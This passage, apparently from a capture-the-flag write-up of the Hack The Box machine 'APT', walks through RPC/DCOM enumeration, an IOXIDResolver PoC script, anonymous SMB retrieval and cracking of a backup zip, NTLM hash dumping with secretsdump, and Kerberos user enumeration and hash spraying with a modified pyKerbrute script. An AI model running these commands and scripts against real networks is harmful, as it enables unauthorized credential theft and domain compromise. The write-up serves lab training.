          ncacn_np:<span style="color:#ae81ff">\\</span>APT<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\I</span>nitShutdown<span style="color:#f92672">]</span>
          ncalrpc:<span style="color:#f92672">[</span>WMsgKRpc06C4F0<span style="color:#f92672">]</span>
...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Received <span style="color:#ae81ff">265</span> endpoints.
</code></pre></div><p>Those <code>ncacn_http</code>, <code>ncacn_np</code>, <code>ncacn_ip_tcp</code> are called as protocol string/protocol sequence. It is the language that a network operating system uses <em>to talk over</em> the network to other computers [<a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwi8veDouNHwAhVbAXIKHYarCu4QFjAAegQIAhAD&amp;url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Frpc%2Fselecting-a-protocol-sequence&amp;usg=AOvVaw14KDvhbl4W2VCPGweUBVzP">source</a>].</p>
<h4 id="scan-for-listening-rpc-interfaces">Scan for Listening RPC Interfaces</h4>
<p>A tool called <code>rpcmap.py</code>, also from Impacket, can be used to get a list of currently listening RPC interfaces that are accessible over TCP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «apt» «10.10.14.72»
$ rpcmap.py <span style="color:#e6db74">&#39;ncacn_ip_tcp:10.10.10.213[135]&#39;</span> -brute-uuid | tee rpc-enum/rpc-services

...&lt;SNIP&gt;...
Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0

Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
Provider: rpcss.dll
UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0

Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
...&lt;SNIP&gt;...

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Tested <span style="color:#ae81ff">354</span> UUID<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</code></pre></div><p>From the results above, three of them are the interfaces provided by DCOM, details of those interfaces are documented by Microsoft in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">well-known UUIDs</a>.</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>GUID</th>
<th>Purpose</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td>IID_IRemoteSCMActivator</td>
<td>{000001A0-0000-0000-C000-000000000046}</td>
<td>RPC interface UUID for IRemoteSCMActivator</td>
<td>RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.</td>
</tr>
<tr>
<td>IID_IActivation</td>
<td>{4d9f4ab8-7d1c-11cf-861e-0020af6e7c57}</td>
<td>RPC interface UUID for IActivation</td>
<td>IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol</td>
</tr>
<tr>
<td>IID_IObjectExporter</td>
<td>{99fcfec4-5260-101b-bbcb-00aa0021347a}</td>
<td>RPC interface UUID for IObjectExporter</td>
<td>IObjectExporter is the interface used for OXID resolution, pinging, and <strong>server aliveness</strong> tests. All object resolvers MUST support the IObjectExporter interface</td>
</tr>
</tbody>
</table>
<h4 id="network-interfaces-enumeration">Network Interfaces Enumeration</h4>
<p>This <a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">articles</a>, written by Nicolas Delhaye, shows that <code>ServerAlive2()</code> method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve list of network interfaces of a remote computer. Nicolas also provides the PoC for this.</p>
<p><img class="img-container" src="imgs/image-20210415065746943.png" alt="image-20210415065746943"  title="List of available methods in IObjectExport interface. "  />
</p>
<blockquote>
<p>Opnum is operation number to identify a specific rpc method or a method in an interface.</p>
</blockquote>
<p>I can use <code>rpcmap.py</code> with <code>-brute-opnums</code> option to determine which interface methods are accessible.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72»
$ rpcmap.py -brute-opnums -opnum-max <span style="color:#ae81ff">5</span> <span style="color:#e6db74">&#39;ncacn_ip_tcp:10.10.10.213&#39;</span>

...&lt;SNIP&gt;...
Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
Opnum 0: rpc_x_bad_stub_data
Opnum 1: rpc_x_bad_stub_data
Opnum 2: rpc_x_bad_stub_data
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: success
</code></pre></div><p>Opnum 3 and Opnum 5 show a success message that means access to ServerAlive() is allowed.</p>
<p>From here, I can use the provided PoC script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> getopt

<span style="color:#f92672">from</span> impacket.dcerpc.v5 <span style="color:#f92672">import</span> transport
<span style="color:#f92672">from</span> impacket.dcerpc.v5.rpcrt <span style="color:#f92672">import</span> RPC_C_AUTHN_LEVEL_NONE
<span style="color:#f92672">from</span> impacket.dcerpc.v5.dcomrt <span style="color:#f92672">import</span> IObjectExporter

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(argv):

    <span style="color:#66d9ef">try</span>:
        opts, args <span style="color:#f92672">=</span> getopt<span style="color:#f92672">.</span>getopt(argv,<span style="color:#e6db74">&#34;ht:&#34;</span>,[<span style="color:#e6db74">&#34;target=&#34;</span>])
    <span style="color:#66d9ef">except</span> getopt<span style="color:#f92672">.</span>GetoptError:
        print <span style="color:#e6db74">&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span>
        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">2</span>)

    target_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.1&#34;</span>

    <span style="color:#66d9ef">for</span> opt, arg <span style="color:#f92672">in</span> opts:
        <span style="color:#66d9ef">if</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-h&#39;</span>:
            print(<span style="color:#e6db74">&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span>)
            sys<span style="color:#f92672">.</span>exit()
        <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;--target&#34;</span>):
            target_ip <span style="color:#f92672">=</span> arg

    authLevel <span style="color:#f92672">=</span> RPC_C_AUTHN_LEVEL_NONE

    stringBinding <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;ncacn_ip_tcp:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> target_ip
    rpctransport <span style="color:#f92672">=</span> transport<span style="color:#f92672">.</span>DCERPCTransportFactory(stringBinding)

    portmap <span style="color:#f92672">=</span> rpctransport<span style="color:#f92672">.</span>get_dce_rpc()
    portmap<span style="color:#f92672">.</span>set_auth_level(authLevel)
    portmap<span style="color:#f92672">.</span>connect()

    objExporter <span style="color:#f92672">=</span> IObjectExporter(portmap)
    bindings <span style="color:#f92672">=</span> objExporter<span style="color:#f92672">.</span>ServerAlive2()

    print(<span style="color:#e6db74">&#34;[*] Retrieving network interface of &#34;</span> <span style="color:#f92672">+</span> target_ip)

    <span style="color:#66d9ef">for</span> binding <span style="color:#f92672">in</span> bindings:
        NetworkAddr <span style="color:#f92672">=</span> binding[<span style="color:#e6db74">&#39;aNetworkAddr&#39;</span>]
        print <span style="color:#e6db74">&#34;Address: &#34;</span> <span style="color:#f92672">+</span> NetworkAddr

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
   main(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:])
</code></pre></div><p>The script successfully identifies two IPv6 addresses of the box.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72» 
$ ./IOXIDResolver.py -t <span style="color:#e6db74">&#39;10.10.10.213&#39;</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::89df:c1d4:6aaf:67ce
</code></pre></div><p>I&rsquo;ll add these addresses to <code>/etc/hosts</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72» 
$ echo <span style="color:#e6db74">&#39;dead:beef::b885:d62a:d679:573f apt&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><blockquote>
<p>For me, scanning those two addresses returns the same result.</p>
</blockquote>
<h3 id="nmap---ipv6">Nmap - IPv6</h3>
<p>This time <code>nmap</code> shows the common ports of Active Directory domain controller</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ nmap -6 --min-rate <span style="color:#ae81ff">1000</span> -sC -sV -oA nmap/initial-apt-ipv6 <span style="color:#e6db74">&#39;dead:beef::b885:d62a:d679:573f&#39;</span> -v

PORT    STATE SERVICE      VERSION
53/tcp  open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
88/tcp  open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-04-15 00:36:03Z<span style="color:#f92672">)</span>
135/tcp open  msrpc        Microsoft Windows RPC
389/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName<span style="color:#f92672">=</span>apt.htb.local
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">2048</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 <span style="color:#ae81ff">8575</span> <span style="color:#ae81ff">7060</span> 683d cdbc 5f86 5d45
|_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time.
445/tcp open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: HTB<span style="color:#f92672">)</span>
464/tcp open  kpasswd5?
593/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Issuer: commonName<span style="color:#f92672">=</span>apt.htb.local
| Public Key type: rsa
| Public Key bits: <span style="color:#ae81ff">2048</span>
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-24T07:07:18
| Not valid after:  2050-09-24T07:17:18
| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
|_SHA-1: f677 c290 98c0 2ac5 <span style="color:#ae81ff">8575</span> <span style="color:#ae81ff">7060</span> 683d cdbc 5f86 5d45
|_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time.
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/14%Time<span style="color:#f92672">=</span>60778A78%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>
|   Computer name: apt
|   NetBIOS computer name: APT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2021-04-15T01:38:41+01:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-15T00:38:39
|_  start_date: 2021-04-14T16:50:06
</code></pre></div><p>I&rsquo;ll take notes on</p>
<ul>
<li>
<p>Domain name: <code>htb.local</code></p>
</li>
<li>
<p>FQDN: <code>apt.htb.local</code></p>
</li>
<li>
<p>Host: Windows Server 2016 Standard 14393</p>
</li>
</ul>
<p>Also, according to a full port scan, WinRM is listening on IPv6</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72»
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> -6 -v <span style="color:#e6db74">&#39;dead:beef::b885:d62a:d679:573f&#39;</span>

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
389/tcp   open  ldap
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49673/tcp open  unknown
49682/tcp open  unknown
49691/tcp open  unknown
</code></pre></div><h3 id="tcp-445---smb-ipv6">TCP 445 - SMB (IPv6)</h3>
<p>Anonymous access is allowed on SMB. The <code>backup</code> share seems interesting here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ smbclient -N -L //apt 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        backup          Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
apt is an IPv6 address -- no workgroup available
</code></pre></div><p>Upon accessing <code>backup</code> share, a backup file named <code>backup.zip</code> is found. I’ll pull it to my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ smbclient -N //apt/backup
Anonymous login successful
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> dir
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Sep <span style="color:#ae81ff">24</span> 03:30:52 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Sep <span style="color:#ae81ff">24</span> 03:30:52 <span style="color:#ae81ff">2020</span>
  backup.zip                          A <span style="color:#ae81ff">10650961</span>  Thu Sep <span style="color:#ae81ff">24</span> 03:30:32 <span style="color:#ae81ff">2020</span>

                <span style="color:#ae81ff">10357247</span> blocks of size 4096. <span style="color:#ae81ff">6964173</span> blocks available
smb: <span style="color:#ae81ff">\&gt;</span> get backup.zip 
getting file <span style="color:#ae81ff">\b</span>ackup.zip of size <span style="color:#ae81ff">10650961</span> as backup.zip <span style="color:#f92672">(</span>502.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 502.9 KiloBytes/sec<span style="color:#f92672">)</span>
</code></pre></div><p>The backup file is protected by a password.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
$ unzip backup.zip 
Archive:  backup.zip
   creating: Active Directory/
<span style="color:#f92672">[</span>backup.zip<span style="color:#f92672">]</span> Active Directory/ntds.dit password: 
</code></pre></div><p>I can use <code>zip2john.py</code> to convert this <code>backup.zip</code> into crackable hash format and transfer the hash to my Windows for cracking.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
$ zip2john backup.zip &gt; backup.zip.hash
→ root@iamf «loot» «10.10.14.72» 
$ cat backup.zip.hash 
backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
</code></pre></div><p>It cracked instantly.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\tools\john\run&gt; ./john.exe hashes/backup.zip.hash --wordlist=C:/tools/rockyou.txt

...&lt;SNIP&gt;...
iloveyousomuch   (backup.zip)
1g 0:00:00:00 DONE (2021-04-15 08:29) 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal
</code></pre></div><p>WIth the password is I obtained, I can unzip the backup file. It contains AD database.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
$ tree
.
├── Active Directory
│   ├── ntds.dit
│   └── ntds.jfm
└── registry
    ├── SECURITY
    └── SYSTEM
</code></pre></div><h4 id="dumping-ntlm-hashes">Dumping NTLM Hashes</h4>
<p><code>ntds.dit</code> is a database file for Active Directory environment, I can use <code>secretsdump.py</code> along with the <code>SECURITY</code> and <code>SYSTEM</code> file to recover it and obtain all the NTLM hashes of all the available AD user accounts</p>
<blockquote>
<p>NTDS stands for New Technology Directory Service and DIT stands for directory information tree.</p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
$ secretsdump.py -ntds Active<span style="color:#ae81ff">\ </span>Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL &gt; ad_hashes
</code></pre></div><p>I saved the hash to a file called <code>ad_hashes</code>.</p>
<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
<h4 id="valid-user-enumeration">Valid User Enumeration</h4>
<p>Because there are so many data to try, I might accidentally get locked out if spraying blindly. But, with tools called <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>, I can enumerate for valid users. The tools uses Kerberos pre-auth to determine a valid user.</p>
<p>If the user is a valid user, KDC returns <code>UF_DONT_REQUIRE_PREAUTH</code>. If it’s not, it returns <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>.</p>
<p>Before that, I&rsquo;ll pull the users and NTLM hash from <code>ad_hashes</code> and store them in separate list. I&rsquo;ll feed <code>users.list</code> to <code>kerbrute</code>.</p>
<p><code>users.list</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
$ cat ad_hashes | grep <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> | cut -d : -f1 &gt; ../users.list
</code></pre></div><p><code>userhash.list</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
$ cat ad_hashes | grep <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee&#39;</span> | cut -d : -f4 &gt; ../userhash.list
</code></pre></div><p>I ran <code>kerbrute</code>, and after some time, it returned three legitimate users.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ kerbrute userenum  --dc apt --domain htb.local users.list

...&lt;SNIP&gt;...
2021/04/14 22:02:35 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
2021/04/14 22:02:35 &gt;   apt:88

2021/04/14 22:03:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       APT$@htb.local
2021/04/14 22:03:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Administrator@htb.local
2021/04/14 22:07:31 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       henry.vinson@htb.local
2021/04/14 22:15:52 &gt;  Done! Tested <span style="color:#ae81ff">2001</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">3</span> valid<span style="color:#f92672">)</span> in 796.320 second
</code></pre></div><p><code>APT$</code> is an account used for authentication purposes in the domain, it can not be used to login into the system. Because of that, I&rsquo;ll only keep <code>administrator</code> and <code>henry.vinson</code> on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.</p>
<h4 id="hash-brute-force">Hash Brute-force</h4>
<p>Using <code>henry.vinson:2de80758521541d19cabba480b260e8f</code> pair returns an authorization error message.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72»
$ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code <span style="color:#ae81ff">1</span>
</code></pre></div><p>Another option is to spray the NTLM hashes on <code>henry.vinson</code>.</p>
<p>Unfortunately, <code>kerbrute</code> doesn&rsquo;t support pass-the-hash yet. But there is a Python version of <code>kerbrute</code> called <code>pyKerbrute</code>. One of its tools called <code>ADPwdSpray.py</code> supports bruteforcing with hash.</p>
<ul>
<li><a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
$ git clone https://github.com/3gstudent/pyKerbrute.git
</code></pre></div><p>By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
        kdc_a <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#75715e"># apt</span>
        user_realm <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>upper() <span style="color:#75715e"># htb.local</span>
        user_name <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># henry.vinson, administrator</span>
        hashes <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">4</span>], <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>readlines() <span style="color:#75715e"># aad3...hashes</span>
        print(<span style="color:#e6db74">&#39;[*] DomainControlerAddr: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(kdc_a))
        print(<span style="color:#e6db74">&#39;[*] DomainName:          </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(user_realm))
        
        <span style="color:#66d9ef">for</span> user_hash <span style="color:#f92672">in</span> hashes:
        	sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">[*] Trying hash: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">%</span>(user_hash)) <span style="color:#75715e"># to make sure it checks every hash in list</span>
        	user_key <span style="color:#f92672">=</span> (RC4_HMAC, user_hash<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;hex&#39;</span>))
        	passwordspray_tcp(user_realm, user_name, user_key, kdc_a, user_hash)
</code></pre></div><p>After a few minutes, it returns a valid hash that works on henry.vinson</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «pyKerbrute» «10.10.14.72» 
$ wc -c ../userhash.list 
<span style="color:#ae81ff">66001</span> userhash.list

→ root@iamf «pyKerbrute» «10.10.14.72» git:<span style="color:#f92672">(</span>temp<span style="color:#f92672">)</span> ✗ 
$ python ADPwdSpray.py apt htb.local <span style="color:#e6db74">&#39;henry.vinson&#39;</span> ../userhash.list | tee ../pykerbrute-spray
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DomainControlerAddr: apt
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DomainName:          HTB.LOCAL

...&lt;SNIP&gt;...
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-henryvinson_adm">Shell as henry.vinson_adm</h3>
<h4 id="forwarding-ipv4---ipv6">Forwarding IPv4 -&gt; IPv6</h4>
<p>Here, a relay or a port forwarding is required to make some tools work on IPv6. I came up with two solutions:</p>
<p>First, use socat.</p>
